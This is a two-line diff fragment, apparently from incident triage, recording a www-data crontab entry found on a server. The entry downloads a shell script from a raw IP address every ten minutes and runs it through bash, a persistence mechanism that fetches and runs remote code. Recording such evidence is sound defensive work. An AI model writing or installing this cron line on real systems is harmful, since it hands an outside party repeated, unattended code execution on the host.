@@ -1,0 +1,2 @@
+# crontab -l -u www-data (captured during triage)
+*/10 * * * * curl -s http://185.220.101.9/i.sh | bash
